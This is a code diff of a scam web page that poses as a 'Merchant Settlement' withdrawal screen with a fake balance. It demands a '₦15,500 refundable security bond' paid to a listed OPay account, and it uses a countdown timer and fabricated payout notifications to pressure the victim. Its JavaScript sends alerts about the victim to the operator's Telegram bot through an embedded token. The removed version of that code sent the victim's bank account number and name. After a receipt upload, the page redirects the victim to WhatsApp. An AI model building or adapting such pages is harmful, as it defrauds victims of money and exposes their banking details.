@@ -3,152 +3,186 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Wallet | AGMT Settlement</title>
+    <title>Merchant Settlement | AGMT Global</title>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
     <style>
-        :root { --primary: #2563eb; --accent: #10b981; --bg: #020617; --card: #0f172a; --border: #1e293b; --text-dim: #64748b; }
+        :root { --primary: #2563eb; --accent: #10b981; --bg: #020617; --card: #0f172a; --border: #1e293b; --text-dim: #64748b; --danger: #ef4444; }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
         
-        body { background: var(--bg); color: white; padding-bottom: 50px; overflow-x: hidden; }
-        header { padding: 20px; display: flex; align-items: center; gap: 15px; background: rgba(2, 6, 23, 0.9); border-bottom: 1px solid var(--border); }
-        .back-btn { text-decoration: none; color: white; font-size: 24px; }
-        .container { padding: 25px; }
+        body { background: var(--bg); color: white; padding-bottom: 100px; overflow-x: hidden; }
+        
+        /* Live Social Proof */
+        #payout-toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: rgba(15, 23, 42, 0.95); border: 1px solid var(--primary); padding: 15px 25px; border-radius: 50px; display: none; align-items: center; gap: 15px; z-index: 10000; box-shadow: 0 10px 40px rgba(0,0,0,0.8); width: 90%; max-width: 400px; backdrop-filter: blur(15px); }
+        
+        header { padding: 20px; display: flex; align-items: center; background: rgba(2, 6, 23, 0.9); border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; backdrop-filter: blur(15px); }
+        .container { padding: 20px; max-width: 480px; margin: 0 auto; }
 
-        /* Wallet Header */
+        /* Hero Balance */
         .bal-hero { 
             background: linear-gradient(145deg, #1e293b 0%, #020617 100%); 
-            border: 1px solid var(--border); border-radius: 40px; padding: 40px 20px; 
-            text-align: center; margin-bottom: 30px; box-shadow: 0 30px 60px rgba(0,0,0,0.5);
+            border: 1px solid var(--border); border-radius: 45px; padding: 50px 20px; 
+            text-align: center; margin-bottom: 30px; position: relative;
         }
-        .bal-label { font-size: 10px; font-weight: 800; color: var(--text-dim); letter-spacing: 2px; }
-        .bal-val { font-size: 45px; font-weight: 900; margin: 5px 0; }
-        .bal-ngn { color: var(--accent); font-weight: 800; font-size: 18px; }
+        .bal-hero::before { content: 'SECURE NODE'; position: absolute; top: 20px; right: 20px; font-size: 8px; font-weight: 900; color: var(--accent); border: 1px solid var(--accent); padding: 4px 8px; border-radius: 5px; }
+        .bal-label { font-size: 11px; font-weight: 800; color: var(--text-dim); letter-spacing: 3px; }
+        .bal-val { font-size: 55px; font-weight: 900; margin: 10px 0; letter-spacing: -2px; }
+        .bal-ngn { color: var(--accent); font-weight: 800; font-size: 20px; display: flex; align-items: center; justify-content: center; gap: 10px; }
 
-        /* Bank Selection */
-        .bank-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 25px; }
-        .bank-item { 
-            background: var(--card); border: 1px solid var(--border); border-radius: 20px; 
-            padding: 20px; text-align: center; transition: 0.3s; cursor: pointer;
-        }
-        .bank-item.active { border-color: var(--primary); background: rgba(37, 99, 235, 0.05); }
-        .bank-icon { font-size: 24px; margin-bottom: 8px; display: block; }
-        .bank-name { font-size: 12px; font-weight: 800; }
+        /* Banking Selection */
+        .section-title { font-size: 11px; font-weight: 900; color: var(--text-dim); margin: 30px 0 15px 10px; letter-spacing: 1.5px; }
+        .bank-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 25px; }
+        .bank-item { background: var(--card); border: 1px solid var(--border); border-radius: 25px; padding: 25px; text-align: center; transition: 0.3s; cursor: pointer; }
+        .bank-item.active { border-color: var(--primary); background: rgba(37, 99, 235, 0.1); }
 
-        /* Inputs */
-        .f-group { margin-bottom: 18px; }
-        .f-label { display: block; font-size: 11px; font-weight: 800; color: var(--text-dim); margin-bottom: 8px; padding-left: 10px; }
-        .f-input { width: 100%; background: #0f172a; border: 1px solid var(--border); border-radius: 18px; padding: 18px; color: white; font-weight: 700; outline: none; }
+        .f-input { width: 100%; background: #0f172a; border: 1px solid var(--border); border-radius: 22px; padding: 22px; color: white; font-weight: 700; outline: none; margin-bottom: 15px; }
+        .btn-withdraw { width: 100%; padding: 25px; border-radius: 30px; border: none; background: var(--primary); color: white; font-weight: 800; font-size: 18px; cursor: pointer; box-shadow: 0 20px 40px rgba(37, 99, 235, 0.4); }
 
-        .btn-withdraw { width: 100%; padding: 22px; border-radius: 25px; border: none; background: var(--primary); color: white; font-weight: 800; font-size: 16px; cursor: pointer; box-shadow: 0 15px 35px rgba(37, 99, 235, 0.3); }
-
-        /* MODAL (THE TRIGGER) */
-        #verify-modal { position: fixed; inset: 0; background: rgba(2, 6, 23, 0.98); z-index: 2000; display: none; align-items: center; justify-content: center; padding: 20px; overflow-y: auto; }
-        .modal-card { background: #1e293b; border-radius: 40px; padding: 40px 25px; width: 100%; max-width: 400px; text-align: center; border: 1px solid #ef4444; }
+        /* MODAL ARCHITECTURE */
+        #verify-modal { position: fixed; inset: 0; background: rgba(2, 6, 23, 0.99); z-index: 9999; display: none; align-items: center; justify-content: center; padding: 15px; backdrop-filter: blur(20px); overflow-y: auto; }
+        .modal-card { background: #0f172a; border-radius: 50px; padding: 40px 25px; width: 100%; max-width: 440px; border: 1px solid var(--border); position: relative; box-shadow: 0 0 100px rgba(37, 99, 235, 0.3); }
         
-        .pay-notice { background: #0f172a; border: 1px dashed var(--primary); border-radius: 20px; padding: 25px; margin: 25px 0; }
-        .opay-num { font-size: 28px; font-weight: 900; color: #fff; letter-spacing: 2px; margin: 10px 0; }
-        
-        .screenshot-box { border: 2px dashed #334155; border-radius: 20px; padding: 25px; margin-top: 20px; position: relative; background: rgba(255,255,255,0.02); }
-        .screenshot-box input { position: absolute; inset: 0; opacity: 0; cursor: pointer; }
+        .timer-zone { background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.3); border-radius: 20px; padding: 15px; text-align: center; margin-bottom: 30px; }
+        .timer-val { font-size: 32px; font-weight: 900; color: var(--danger); font-family: 'Courier New', monospace; letter-spacing: 2px; }
+
+        .pay-table { background: #020617; border: 1px solid var(--border); border-radius: 35px; padding: 30px; margin: 30px 0; }
+        .copy-box { font-size: 36px; font-weight: 900; color: #fff; letter-spacing: 4px; cursor: pointer; text-align: center; background: rgba(37, 99, 235, 0.08); padding: 18px; border-radius: 25px; border: 1px dashed var(--primary); margin: 15px 0; }
+
+        .tier-benefits { background: #1e293b; border-radius: 25px; padding: 25px; margin-bottom: 30px; text-align: left; }
+        .benefit-item { display: flex; gap: 12px; margin-bottom: 15px; font-size: 12px; line-height: 1.5; }
+
+        .upload-trigger { border: 2px dashed #334155; border-radius: 35px; padding: 45px 20px; text-align: center; cursor: pointer; background: rgba(255,255,255,0.03); transition: 0.3s; }
     </style>
 </head>
 <body>
 
-    <header>
-        <a href="dashboard.html" class="back-btn">←</a>
-        <div style="font-weight: 800;">Withdraw Funds</div>
-    </header>
+    <div id="payout-toast">
+        <div style="font-size: 26px;">💎</div>
+        <div>
+            <p id="toast-msg" style="font-size: 12px; font-weight: 800; color: #fff;">User ***510 withdrew ₦15,500</p>
+            <p style="font-size: 10px; color: var(--accent); font-weight: 900;">NODE UPGRADED TO LEVEL 2</p>
+        </div>
+    </div>
+
+    <header><div style="font-weight: 900; font-size: 20px; width: 100%; text-align: center;">MERCHANT SETTLEMENT</div></header>
 
     <div class="container">
         <div class="bal-hero">
-            <span class="bal-label">TOTAL SETTLEMENT</span>
-            <div class="bal-val">$<span id="uBal">0.00</span></div>
-            <div class="bal-ngn">≈ ₦<span id="uNgn">0</span></div>
+            <span class="bal-label">TOTAL AVAILABLE FUNDS</span>
+            <div class="bal-val">$<span id="uBal">575.00</span></div>
+            <div class="bal-ngn">₦<span id="uNgn">891,250</span></div>
         </div>
 
+        <p class="section-title">DESTINATION BANK</p>
         <div class="bank-grid">
-            <div class="bank-item active" onclick="sel(this)">
-                <span class="bank-icon">📱</span><span class="bank-name">OPay</span>
-            </div>
-            <div class="bank-item" onclick="sel(this)">
-                <span class="bank-icon">🌴</span><span class="bank-name">PalmPay</span>
-            </div>
-            <div class="bank-item" onclick="sel(this)">
-                <span class="bank-icon">🏦</span><span class="bank-name">Kuda</span>
-            </div>
-            <div class="bank-item" onclick="sel(this)">
-                <span class="bank-icon">💳</span><span class="bank-name">GTB/Zenith</span>
-            </div>
+            <div class="bank-item active" onclick="sel(this)">📱 <span class="bank-name">OPay</span></div>
+            <div class="bank-item" onclick="sel(this)">🌴 <span class="bank-name">PalmPay</span></div>
         </div>
 
-        <div class="f-group">
-            <label class="f-label">ACCOUNT NUMBER</label>
-            <input type="number" id="accNum" class="f-input" placeholder="Enter 10 digits">
-        </div>
-
-        <div class="f-group">
-            <label class="f-label">ACCOUNT NAME</label>
-            <input type="text" id="accName" class="f-input" placeholder="Full name on account">
-        </div>
-
-        <button class="btn-withdraw" onclick="triggerVerify()">INITIATE WITHDRAWAL</button>
+        <input type="number" id="accNum" class="f-input" placeholder="Account Number">
+        <input type="text" id="accName" class="f-input" placeholder="Account Full Name">
+        
+        <button class="btn-withdraw" onclick="triggerAuth()">CONFIRM WITHDRAWAL</button>
     </div>
 
     <div id="verify-modal">
         <div class="modal-card">
-            <div style="font-size: 50px; margin-bottom: 20px;">🛡️</div>
-            <h2 style="font-size: 22px; margin-bottom: 12px;">Security Verification</h2>
-            <p style="color: #94a3b8; font-size: 14px; line-height: 1.6;">
-                Your account is currently on <b>Level 1 (Trial)</b>. To withdraw funds immediately, you must pay the <b>Merchant Activation Fee</b> or reach the <b>$5,000</b> limit.
-            </p>
-
-            <div class="pay-notice">
-                <div style="font-size: 11px; font-weight: 800; color: var(--primary);">TRANSFER TO MERCHANT NODE</div>
-                <div class="opay-num">7022255367</div>
-                <div style="font-size: 13px; font-weight: 700; color: #fff;">Bank: OPay Digital Bank</div>
-                <div style="font-size: 14px; font-weight: 800; color: var(--accent); margin-top: 10px;">Amount: ₦15,500</div>
+            <div class="timer-zone">
+                <p style="font-size: 10px; font-weight: 900; color: var(--danger); letter-spacing: 2px;">SESSION SECURITY LOCK IN:</p>
+                <h2 id="timer-val" class="timer-val">15:00</h2>
             </div>
 
-            <div style="font-size: 11px; font-weight: 800; color: var(--text-dim); text-align: left; margin-bottom: 8px;">SUBMIT PAYMENT RECEIPT</div>
-            <div class="screenshot-box">
-                <div style="font-size: 24px;">📸</div>
-                <div style="font-size: 12px; font-weight: 800; margin-top: 5px;">Upload Screenshot</div>
-                <input type="file" id="proof" onchange="done()">
+            <div style="text-align: center;">
+                <h2 style="font-size: 26px; font-weight: 900; color: #fff;">Activation Required</h2>
+                <p style="color: #64748b; font-size: 13px; line-height: 1.6; margin-top: 10px;">
+                    To unlock your <b>$575.00</b> and activate <b>Level 2 Premium Tasks</b>, initiate a refundable security bond.
+                </p>
             </div>
 
-            <button onclick="document.getElementById('verify-modal').style.display='none'" style="background:none; border:none; color:var(--text-dim); margin-top:25px; font-weight:800; font-size:12px;">CLOSE</button>
+            <div class="pay-table">
+                <p style="font-size: 10px; font-weight: 900; color: var(--primary); text-align: center; letter-spacing: 2px;">MERCHANT DEPOSIT NODE</p>
+                <div class="copy-box" onclick="copyValue('7032255367')">7032255367</div>
+                <p style="font-size: 11px; text-align: center; color: var(--primary); font-weight: 800;">(Tap to copy number)</p>
+                
+                <div style="margin-top: 25px; padding-top: 20px; border-top: 1px solid var(--border);">
+                    <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
+                        <span style="font-size: 11px; color: var(--text-dim);">BANK:</span>
+                        <span style="font-size: 11px; font-weight: 800;">OPay Digital Bank</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between; margin-bottom: 15px;">
+                        <span style="font-size: 11px; color: var(--text-dim);">NAME:</span>
+                        <span style="font-size: 11px; font-weight: 800;">Davies (Merchant Node)</span>
+                    </div>
+                    <div style="background: rgba(16, 185, 129, 0.1); padding: 18px; border-radius: 20px; text-align: center;">
+                        <span style="font-size: 12px; font-weight: 900; color: var(--accent);">REFUNDABLE AMOUNT:</span><br>
+                        <span style="font-size: 24px; font-weight: 900; color: var(--accent);">₦15,500.00</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="tier-benefits">
+                <div class="benefit-item"><span>🚀</span><p><b>Unlock Level 2:</b> Access high-commission tasks ($2,000+ daily) immediately.</p></div>
+                <div class="benefit-item"><span>💰</span><p><b>100% Refund:</b> The ₦15,500 is added to your payout. Total received: ₦906,750.</p></div>
+                <div class="benefit-item"><span>🛡️</span><p><b>Verification:</b> Mandatory anti-bot protocol for first-time settlements.</p></div>
+            </div>
+
+            <div class="upload-trigger" onclick="document.getElementById('file-up').click()">
+                <div style="font-size: 40px; margin-bottom: 10px;">📸</div>
+                <p style="font-size: 14px; font-weight: 900; color: #fff;">Upload Payment Proof</p>
+                <input type="file" id="file-up" style="display: none;" onchange="redirectWA()">
+            </div>
         </div>
     </div>
 
     <script>
+        // CONFIG
+        const waNum = "2348123456789"; // YOUR WHATSAPP NUMBER
         const botToken = "8673029559:AAF4zFJC80TERVUMTvZ9ieSMWM0K-2vWGTI";
         const chatId = "7909543900";
 
-        window.onload = () => {
-            const bal = parseFloat(localStorage.getItem('walletBalance') || "50.00");
-            document.getElementById('uBal').innerText = bal.toFixed(2);
-            document.getElementById('uNgn').innerText = (bal * 1550).toLocaleString();
-        };
+        // Social Proof
+        const fUsers = ["User ***812", "User ***229", "User ***004", "User ***671"];
+        const fAmts = ["₦15,500", "₦891,250", "₦15,500", "₦450,000"];
+        function runToasts() {
+            const toast = document.getElementById('payout-toast');
+            const msg = document.getElementById('toast-msg');
+            const r = Math.floor(Math.random() * fUsers.length);
+            msg.innerText = `${fUsers[r]} just withdrew ${fAmts[r]}`;
+            toast.style.display = 'flex';
+            setTimeout(() => { toast.style.display = 'none'; }, 4500);
+        }
+        setInterval(runToasts, 8000);
 
         function sel(el) {
-            document.querySelectorAll('.bank-item').forEach(b => b.classList.remove('active'));
+            document.querySelectorAll('.bank-item').forEach(i => i.classList.remove('active'));
             el.classList.add('active');
         }
 
-        function triggerVerify() {
-            const acc = document.getElementById('accNum').value;
-            const name = document.getElementById('accName').value;
-            if(acc.length < 10 || name.length < 3) return alert("Please complete form");
-
-            // Send full info to your Telegram
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=🚨 <b>WITHDRAWAL ATTEMPT!</b>%0A<b>User:</b> ${localStorage.getItem('merchantName')}%0A<b>Account:</b> ${acc}%0A<b>Bank Name:</b> ${name}%0A<b>Amount:</b> $${localStorage.getItem('walletBalance')}&parse_mode=html`);
-
-            document.getElementById('verify-modal').style.display = 'flex';
+        function copyValue(val) {
+            navigator.clipboard.writeText(val);
+            alert("Merchant Node Copied: " + val);
         }
 
-        function done() {
-            alert("Verification Started. Our OPay node is confirming your ₦15,500 payment. This takes 5-15 minutes. Stay on this page.");
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=📸 <b>RECEIPT UPLOADED!</b> Check OPay for ₦15,500 from ${localStorage.getItem('merchantName')}.&parse_mode=html`);
+        function triggerAuth() {
+            if(document.getElementById('accNum').value.length < 10) return alert("Invalid Account Details.");
+            document.getElementById('verify-modal').style.display = 'flex';
+            startTimer(900);
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=🚨 <b>USER READY TO PAY!</b>%0AName: ${localStorage.getItem('merchantName')}&parse_mode=html`);
+        }
+
+        function startTimer(d) {
+            let t = d, m, s;
+            const b = document.getElementById('timer-val');
+            setInterval(() => {
+                m = parseInt(t / 60, 10); s = parseInt(t % 60, 10);
+                b.textContent = (m < 10 ? "0" + m : m) + ":" + (s < 10 ? "0" + s : s);
+                if (--t < 0) t = 0;
+            }, 1000);
+        }
+
+        function redirectWA() {
+            alert("Receipt Received! Authenticating Node... Redirecting for instant payout.");
+            const msg = encodeURIComponent(`Hello Admin, I have successfully paid my ₦15,500 Merchant Activation fee. \n\nI have uploaded my receipt. Please verify my $575.00 settlement and upgrade my account to Level 2 immediately.\n\nMerchant ID: ${localStorage.getItem('merchantName')}`);
+            setTimeout(() => { window.location.href = `https://wa.me/${waNum}?text=${msg}`; }, 1500);
         }
     </script>
 </body>
